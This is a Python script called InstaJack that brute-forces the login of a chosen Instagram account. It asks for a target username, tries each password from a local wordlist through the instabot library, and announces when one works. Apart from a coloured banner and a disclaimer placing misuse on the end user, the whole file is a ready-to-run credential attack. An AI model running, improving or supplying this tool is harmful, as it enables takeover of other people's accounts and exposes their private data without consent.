from instabot import Bot
import os
b = Bot()
f = open("passwords.txt","r+")
passwords = f.readlines()
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
print(bcolors.UNDERLINE+bcolors.FAIL+'''

 ██▓ ███▄    █   ██████ ▄▄▄█████▓ ▄▄▄      ▄▄▄██▀▀▀▄▄▄       ▄████▄   ██ ▄█▀
▓██▒ ██ ▀█   █ ▒██    ▒ ▓  ██▒ ▓▒▒████▄      ▒██  ▒████▄    ▒██▀ ▀█   ██▄█▒ 
▒██▒▓██  ▀█ ██▒░ ▓██▄   ▒ ▓██░ ▒░▒██  ▀█▄    ░██  ▒██  ▀█▄  ▒▓█    ▄ ▓███▄░ 
░██░▓██▒  ▐▌██▒  ▒   ██▒░ ▓██▓ ░ ░██▄▄▄▄██▓██▄██▓ ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄ 
░██░▒██░   ▓██░▒██████▒▒  ▒██▒ ░  ▓█   ▓██▒▓███▒   ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄
░▓  ░ ▒░   ▒ ▒ ▒ ▒▓▒ ▒ ░  ▒ ░░    ▒▒   ▓▒█░▒▓▒▒░   ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒
 ▒ ░░ ░░   ░ ▒░░ ░▒  ░ ░    ░      ▒   ▒▒ ░▒ ░▒░    ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░
 ▒ ░   ░   ░ ░ ░  ░  ░    ░        ░   ▒   ░ ░ ░    ░   ▒   ░        ░ ░░ ░ 
 ░           ░       ░                 ░  ░░   ░        ░  ░░ ░      ░  ░   
                                                            ░               
                                                  
''')
print(bcolors.BOLD+"InstaJack - Brute Force Instagram login using InstaJack\nAuthor - Anurag Choudhary (@Anonymous2309)\nWARNING : Any misuse of this program is full responsibility of the end-user. Not of Develoer (Only use if you agree to this)")
usr = str(input(bcolors.WARNING+'Enter the target username : '))
print(bcolors.HEADER+bcolors.OKCYAN+"Write the passwords to passwords.txt file\nHit Enter to begin the attack")
for pwd in passwords:
    try:
        b.login(username=usr,password=pwd)
        print(bcolors.OKGREEN + "[+] Boom! Password Found :- ",pwd)
        break
    except:
        print(bcolors.FAIL + "[-] Password",pwd," not matched!")
